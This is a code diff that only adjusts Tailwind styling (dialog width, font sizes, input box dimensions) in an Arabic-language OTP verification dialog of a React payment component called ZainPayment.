@@ -517,9 +517,9 @@ export default function ZainPayment() {
 
         {/* Enhanced OTP Dialog */}
         <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
-          <DialogContent className="sm:max-w-lg bg-white/95 backdrop-blur-sm" dir="rtl">
+          <DialogContent className=" bg-white/95 backdrop-blur-sm" dir="rtl">
             <DialogHeader className="space-y-4">
-              <DialogTitle className="text-2xl font-bold text-center text-gray-800">التحقق من الدفع</DialogTitle>
+              <DialogTitle className="text-xl font-bold text-center text-gray-800">التحقق من الدفع</DialogTitle>
               <DialogDescription className="text-center text-gray-600">
                 أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك
               </DialogDescription>
@@ -528,17 +528,17 @@ export default function ZainPayment() {
             <div className="bg-gradient-to-r from-[#2d1a45] to-[#6b2a84] rounded-xl p-4 text-white mb-6">
               <div className="flex justify-between items-center mb-2">
                 <span className="text-white/80">رقم الطلب:</span>
-                <span className="font-mono font-medium">{orderDetails.id}</span>
+                <span className="font-mono font-sm">{orderDetails.id}</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="text-white/80">المبلغ:</span>
-                <span className="font-bold text-lg">{orderDetails.total} د.ك</span>
+                <span className="font-bold text-sm">{orderDetails.total} د.ك</span>
               </div>
             </div>
 
             <div className="text-center mb-6">
               <p className="text-sm mb-2 text-gray-600">تم إرسال رمز التحقق إلى</p>
-              <p className="font-semibold text-lg text-gray-800">+965 5XX XXX XX89</p>
+              <p className="font-semibold text-sm text-gray-800">+965 5XX XXX XX89</p>
             </div>
 
             <div className="flex justify-center gap-3 my-8">
@@ -552,7 +552,7 @@ export default function ZainPayment() {
                     value={value}
                     onChange={(e) => handleOtpChange(index, e.target.value)}
                     onKeyDown={(e) => handleKeyDown(index, e)}
-                    className={`w-14 h-16 text-center text-xl font-bold border-2 rounded-lg ${otpError ? "border-red-300" : "border-gray-300 focus:border-[#d13c8c]"
+                    className={`w-10 h-12 text-center text-sm font-bold border-2 rounded-lg ${otpError ? "border-red-300" : "border-gray-300 focus:border-[#d13c8c]"
                       }`}
                   />
                 </div>
